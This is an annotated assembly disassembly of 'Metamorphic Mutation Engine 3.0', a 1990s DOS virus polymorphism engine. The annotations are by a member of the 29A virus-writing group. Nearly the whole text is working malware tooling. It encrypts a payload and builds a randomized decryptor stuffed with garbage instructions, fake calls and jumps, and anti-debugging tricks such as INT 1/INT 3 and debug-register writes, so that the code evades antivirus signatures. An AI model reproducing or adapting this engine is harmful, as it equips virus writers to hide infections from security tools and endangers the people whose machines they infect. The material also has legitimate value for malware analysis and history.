   ; - -[MME.ASM]- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
   ;
   ; Metamorphic Mutation Engine 3.0 (MME 3.0), by SSR
   ; Disasm by Tcp/29A (tcp@cryogen.com)
   ;
   ; Entry:
   ;  BX = runtime offset (delta offset)
   ;  DS:DX = code to be encrypted
   ;  ES = work segment
   ;  CX = size
   ; Return :
   ;  DS:DX = decryptor + code
   ;  CX = size decryptor + code


                   MME30  segment
                   assume cs:MME30, ds:MME30, es:MME30, ss:MME30
                   org     0

   MME_DEC_SIZE    =       1500
   SIZE_MME        =       end_mme - start

   mme_engine:
   start:
                   call    MME_delta
   MME_delta:
           pop si
                   sub     si,3            ; Get delta offset
           pop ax
           push    cs
           push    ax
                   mov     di,100h
           push    es
                   mov     ax,es
                   sub     ax,10h
                   mov     es,ax
           push    cx
                   mov     cx,SIZE_MME
           nop
           push    ds
           push    cs
           pop ds
           cld
                   rep     movsb           ; Copy code to buffer
           pop ds
           pop cx
                   mov     ax,offset(mme_start)+100h
           push    es
           push    ax
                   retf                    ; Jump to copy (mme_start)

   mme_start:
                   pop     es
                   mov     si,100h
                   mov     ax,es
                   add     ax,(SIZE_MME+15)/16+1
                   mov     es,ax
                   mov     cs:[si+ofs_in_file],bx
                   mov     cs:[si+length_code],cx
                   mov     cs:[si+base_code],dx
           cld
                   mov     al,90h          ; NOP
                   xor     di,di
                   mov     cx,MME_DEC_SIZE ; Length of decryptor
                   rep     stosb           ; Fill with NOPs
                   xor     di,di
           cld
   more_garbage:
                   call    make_garbage
                   call    get_random
                   and     al,7            ; AL in [0..7]
                   cmp     al,1            ; Generate call?
                   jne     gen_jx?         ; No? then jmp
           nop
           nop
           nop
                   call    generate_call
                   jmp     check_garbage_s
           nop

   gen_jx?:
                   cmp     al,2            ; Generate conditional jump+garbage?
                   jne     check_garbage_s ; No? then jmp
           nop
           nop
           nop
                   call    generate_jx_garbage

   check_garbage_s:
                   cmp     di,1000         ; <1000 bytes of garbage?
                   jb      more_garbage    ; Yes? then jmp
                   call    get_random
                   and     ax,1Fh          ; AX in [0..31]
                   add     ax,1150         ; [1150..1181]: Return from RETF
                   mov     cs:[si+return_retf],ax
           push    ax
                   mov     ax,0C63Eh       ; MOV DS:
           stosw
                   mov     al,6            ; [addr16],inm8
           stosb
                   mov     ah,0
                   call    get_random
                   and     al,3Fh
                   add     al,0C0h         ; AX in [0C0h..0FFh]
                   mov     cs:[si+addr_retf],ax
                   stosw                   ; [addr16]:=[0C0h..0FFh]
                   mov     al,0CBh         ; inm8:=RETF
                   stosb                   ; Generated: mov byte ptr ds:[xxxx],0CBh
                   call    generate_garbage
                   mov     al,0Eh          ; Generate PUSH CS
           stosb
                   call    generate_garbage
                   mov     al,68h          ; Generate PUSH inmediate (ret address)
           stosb
           pop ax
                   add     ax,cs:[si+ofs_in_file]
                   stosw                   ; Return address from retf
                   call    generate_garbage
                   mov     al,1Eh          ; Generate PUSH DS
           stosb
                   call    generate_garbage
                   mov     al,68h          ; Generate PUSH inmediate (to RETF)
           stosb
                   mov     ax,cs:[si+addr_retf]
                   stosw                   ; Address of runtime generated RETF
                   call    generate_garbage
                   mov     al,0CBh         ; Generate RETF (jmp to generated RETF)
           stosb
                   mov     cx,cs:[si+return_retf]
                   sub     cx,di           ; Fill with garbage to return address
   l_more_shit:
                   call    get_random
           stosb
                   loop    l_more_shit
                   call    generate_garbage
                   call    get_random
                   and     ax,3            ; AX in [0..3]
                   mov     bp,ax           ; Select register index
                   mov     al,byte ptr cs:[bp+si+regop_table]
                   mov     cs:[si+indexop_reg],al
                   mov     ah,byte ptr cs:[bp+si+regop2_table]
           and ah,7
                   mov     cs:[si+indexop2_reg],ah
                   mov     al,0C7h         ; Generate MOV reg16,inm
                                           ;   MOV reg_index,start address
           stosb
           mov al,0C0h
                   add     al,ah           ; reg16=(SI or DI)
           stosb
                   mov     ax,MME_DEC_SIZE ; Calculate starting address to decrypt
                   add     ax,cs:[si+ofs_in_file]
                   add     ax,cs:[si+length_code]
           stosw
                   call    generate_garbage
                   mov     cs:[si+decryptor_ofs],di        ; Start decryptor
                   call    generate_encryptor
                   mov     cx,cs:[si+length_code]
                   add     cx,MME_DEC_SIZE                 ; Code + decryptor
           push    es
           pop ds
           xor dx,dx
           retf

                   db      'MME v 2.00',0          ; 2.0??? It's 3.0 ;)
                   db      'ü S.S.R. 1996-97',0

   generate_segmentprefix:
                   and     al,00011000b
                   add     al,26h          ; 00h+26h = 26h (ES:)
                                           ; 10h+26h = 36h (SS:)
                                           ; 08h+26h = 2Eh (CS:)
                                           ; 18h+26h = 3Eh (DS:)
                   stosb
                   ret

   generate_1byteinst:
                   and     ax,0Fh          ; AX in [0..15]
                   mov     bp,offset(MME_1byte)
                   add     bp,ax
                   mov     al,cs:[bp+si]   ; Generate 1 byte instruction
           stosb
           ret

   generate_reg8reg8:
                   call    generate_toreg8
           stosb
                   call    get_random
                   and     al,00111111b    ; Allow all registers
                   add     al,11000000b    ; Mode 3: Register to Register
           stosb
                   ret

   generate_reg8addr16:
                   call    generate_toreg8
           stosb
                   call    get_random
                   and     al,00111111b    ; Allow all registers
                   add     al,10000000b    ; Mode 2: Inmediate 16 bits address
           stosb
                   call    get_random      ; Generate word
           stosb
                   call    get_random
           stosb
           ret

   generate_reg8inm:
                   mov     al,10000000b    ; [3 bytes operation]; to reg; 8 bits
           stosb
                   call    generate_regop
           stosb
                   call    get_random      ; Generate inmediate value
           stosb
                   ret

   generate_jmpshort:
                   mov     al,0EBh         ; Generate JMP xx (short)
           stosb
           push    di
           inc di
                   call    generate_shit   ; 1 to 8 bytes of shit
           pop bp
                   mov     ax,di           ; Calculate offset of JMP (skip shit)
           sub ax,bp
           dec al
                   mov     es:[bp],al      ; Store offset
           ret

   generate_shift8:
                   and     al,00000010b    ; 8 bits
                   add     al,11010000b    ; [RCL,RCR,ROL,ROR,SHL,SHR,SAL,SAR]
           stosb
                   call    generate_regop2
           stosb
           ret

   generate_in:
                   mov     al,0E4h         ; Generate IN AL,xx
           stosb
                   call    get_random      ; Random port
           stosb
                   inc     di              ; Generate NOP
           ret


   generate_int1_int3:
                   mov     al,0CDh         ; Generate INT xx
           stosb
                   call    get_random
                   rcr     al,1            ; Generate int 3?
                   jc      generate_int3   ; Yes? then jmp
           nop
           nop
           nop
                   mov     al,1            ; Generate int 1
                   jmp     store_int
                   nop

   generate_int3:
           mov al, 3
   store_int:
           stosb
                   ret

   generate_movdrx:
                   mov     ax,230Fh        ; Generate MOV dr?,extended-register
           stosw
                   call    get_random
                   and     al,1Fh
                   add     al,0C0h         ; AL in [0C0h..0DFh]
           stosb
           ret

   generate_reg32reg32:
                   mov     al,66h          ; Extended register prefix
           stosb
                   call    get_random
                   and     al,00111000b    ; [ADD,OR,ADC,SBB,AND,SUB,XOR,CMP]
                   add     al,00000011b    ; to reg; 16 bits
           stosb
                   call    get_random
                   and     al,00011111b    ; Don't use ESP,EBP,ESI,EDI as dest.
                   add     al,11000000b    ; Mode 3: Register to register
           stosb
           ret

   generate_reg32inm32:
                   mov     ax,8166h        ; Extended regs; 6 bytes operation
           stosw
                   call    get_random
                   and     al,00111011b    ; Don't use ESP,EBP,ESI,EDI as dest.
                   add     al,11000000b
           stosb
           push    cx
                   mov     cx,4            ; Generate a double word
   l_gen_doubleword:
                   call    get_random
                   stosb
                   loop    l_gen_doubleword
           pop cx
           ret

   MME_function_table:
                   dw      offset(generate_segmentprefix)
                   dw      offset(generate_1byteinst)
                   dw      offset(generate_reg8reg8)
                   dw      offset(generate_reg8addr16)
                   dw      offset(generate_reg8inm)
                   dw      offset(generate_jmpshort)
                   dw      offset(generate_shift8)
                   dw      offset(generate_in)
                   dw      offset(generate_int1_int3)
                   dw      offset(generate_movdrx)
                   dw      offset(generate_reg32reg32)
                   dw      offset(generate_reg32inm32)
                   dw      offset(generate_reg8reg8)
                   dw      offset(generate_reg8addr16)
                   dw      offset(generate_reg8inm)
                   dw      offset(generate_jmpshort)

   get_random:
           pushf
           push    cx
                   in      al,40h          ; Get random number
           mov cl,al
                   in      al,40h          ; Get random number
           ror al,cl
           xor al,cl
           inc al
           pop cx
           popf
           ret

   generate_toreg8:
                   call    get_random
                   and     al,00111000b    ; [ADD,OR,ADC,SBB,AND,SUB,XOR,CMP]
                   add     al,00000010b    ; to reg; 8 bits
           ret

   generate_regop:
                   call    get_random
                   and     al,00111111b    ; All registers
                   add     al,11000000b    ; Mode 3: Register to register
           ret

   generate_regop2:                        ; = generate_regop !!
                   call    get_random
                   and     al,00111111b
                   add     al,11000000b
           ret

   ;; Unused code !! ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                   call    get_random
                   and     al,00111111b
                   add     al,10000000b
           ret
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

   generate_shit:
           push    cx
                   call    get_random
                   and     ax,7
                   inc     ax              ; AX in [1..8]
                   mov     cx,ax
   l_gen_shit:
                   call    get_random
           stosb
                   loop    l_gen_shit
           pop cx
           ret

   generate_jx_garbage:
                   call    get_random
                   and     al,0Fh
                   add     al,70h  ; AL in [70h..7Fh] Generate conditional jump
   ofsret_garbage:
                   stosb
                   push    di      ; Save offset address
           inc di
           push    cx
                   call    get_random
                   and     ax,3
                   mov     cx,ax
                   inc     cx      ; CX in [1..4]
   l_call_table:
                   call    get_random
                   mov     bx,ax
                   and     bx,7    ; BX in [0..7]
                   shl     bx,1    ; Select garbage function from table
                   mov     bp,word ptr cs:[bx+si+MME_function_table]
                   call    get_random
                   add     bp,si
                   call    bp      ; Call garbage funtion
                   loop    l_call_table
           pop cx
           pop bp
                   mov     ax,di
                   sub     ax,bp
                   mov     es:[bp],al
                   call    get_random
                   call    generate_1byteinst
                   ret

   generate_call:
                   mov     al,0E8h         ; CALL
           stosb
           push    di
           inc di
                   inc     di              ; Space for offset
           push    cx
                   call    get_random
                   and     ax,3            ; AX in [0..3]
                   mov     cx,ax
                   inc     cx              ; CX in [1..4]
   l_call_table2:
                   call    get_random
                   mov     bx,ax
                   and     bx,7            ; BX in [0..7]
                   shl     bx,1            ; BX:=BX*2
                   mov     bp,word ptr cs:[bx+si+MME_function_table]
                   call    get_random
                   add     bp,si
                   call    bp              ; Call garbage function
                   loop    l_call_table2
           pop cx
           pop bp
                   mov     ax,di
                   sub     ax,bp
                   mov     es:[bp],ax
                   mov     al,0EBh         ; JMP
                   call    ofsret_garbage
           dec di
                   mov     al,0C3h         ; Generate RET
           stosb
           ret

   make_garbage:
           push    ax
           push    bp
           push    bx
                   call    get_random
                   and     ax,0Fh          ; [0..15]
                   shl     ax,1            ; AX:=AX*2
                   mov     bp,ax           ; Select garbage funtion
                   mov     bx,word ptr cs:[bp+si+MME_function_table]
                   add     bx,si
                   call    get_random
                   call    bx              ; Call garbage table
           pop bx
           pop bp
           pop ax
           ret

   generate_garbage:
           push    cx
                   call    get_random
                   and     ax,3            ; AX in [0..3]
                   inc     ax
                   mov     cx,ax           ; CX in [1..4]
   l_mk_garbage:
                   call    make_garbage
                   loop    l_mk_garbage
           pop cx
           ret

   generate_encryptor:
                   mov     cx,8            ; 8 encryption/decryption instructions
                   mov     bx,offset(first_enc_inst)
   l_generate_encryptor:
                   call    get_random
                   and     ax,3            ; AX in [0..3]
                   mov     bp,ax
                   shl     bp,1
                   shl     bp,1            ; BP:=AX*4
                   call    get_random
                   mov     cs:[si+_mask],al                ; Generate mask
                   mov     ax,word ptr cs:[bp+si+encrypt_table]    ; Encrypt op.
                   mov     cs:[bx+si],ax                   ; Store it
                   mov     ax,word ptr cs:[bp+si+encrypt_table+2]
                   mov     ah,cs:[si+_mask]                ; xxx es:[xx],_mask
                   mov     cs:[bx+si+2],ax
                   mov     ax,word ptr cs:[bp+si+decrypt_table]    ; Decrypt op.
                   stosw                                   ; Store it
                   mov     ax,word ptr cs:[bp+si+decrypt_table+2]
                   and     al,0F8h                         ; Clear index register
                   add     al,cs:[si+indexop_reg]          ; Register index [xx]
                   mov     ah,cs:[si+_mask]                ; xxx cs:[xx],_mask
           stosw
                   call    generate_garbage
                   sub     bx,4
                   loop    l_generate_encryptor            ; and decryptor
           push    di
                   mov     cx,cs:[si+length_code]          ; Bytes to encrypt
                   mov     di,MME_DEC_SIZE                 ; Destination
                   mov     bp,cs:[si+base_code]            ; Source
   l_encrypt_code:
                   mov     al,ds:[bp]
           mov es:[di],al
                   db      8*4 dup(90h)    ; 8 instructions; 4 bytes each one
   first_enc_inst  equ     $-4
                   inc     di
           inc bp
                   loop    l_encrypt_code
           pop di
                   call    generate_garbage
                   mov     al,48h          ; Generate DEC register index
                   add     al,cs:[si+indexop2_reg]
           stosb
                   call    generate_garbage
                   mov     ax,0F881h       ; Generate CMP reg index,end decryption
                   add     ah,cs:[si+indexop2_reg]
           stosw
                   mov     ax,cs:[si+ofs_in_file]
                   add     ax,MME_DEC_SIZE-1
           stosw
                   mov     ax,840Fh        ; Generate JE xxxx (JE decrypted code)
           stosw
                   mov     ax,MME_DEC_SIZE-2
           sub ax,di
           stosw
                   mov     al,0E9h         ; Generate JMP xxxx (decryptor loop)
           stosb
                   mov     ax,cs:[si+decryptor_ofs]        ; Start of decryptor
           sub ax,di
           dec ax
           dec ax
           stosw
                   mov     cx,MME_DEC_SIZE
                   sub     cx,di           ; Fill free space with shit
   l_shit:
                   call    get_random
           stosb
                   loop    l_shit
                   ret

   encrypt_table:
                   xor     byte ptr es:[di],0
                   add     byte ptr es:[di],0
                   sub     byte ptr es:[di],0
                   add     byte ptr es:[di],0
   decrypt_table:
                   xor     byte ptr cs:[di],0
                   sub     byte ptr cs:[di],0
                   add     byte ptr cs:[di],0
                   sub     byte ptr cs:[di],0

   ofs_in_file     dw      0
   base_code       dw      0
   length_code     dw      0
   indexop2_reg    db      0
   return_retf     dw      0
   _mask           db      0
   indexop_reg     db      0
   decryptor_ofs   dw      0
   addr_retf       dw      0

   MME_1byte:
                   cli
                   cmc
                   stc
                   clc
                   std
                   cld
                   aaa
                   daa
                   aas
                   das
                   sti
                   cbw
                   cwd
                   int     3
                   db      0F3h    ; REP
                   nop

   regop2_table:
                   db      0FFh    ; DI
                   db      0F6h    ; SI
                   db      0FFh    ; DI
                   db      0F6h    ; SI

   regop_table:
                   db      5       ; DI
                   db      4       ; SI
                   db      5       ; DI
                   db      4       ; SI

                   db      'Metamorphic Mutation Engine v 3.00',0
                   db      '(C) Stainless Steel Rat 1996-97',0
                   db      'It''s C00LEST Engine',0

   end_mme:

   MME30           ends
   public          mme_engine
                   end

   ; End of MME 3.0 disasm
   ; (c) 1997, Tcp/29A (tcp@cryogen.com)
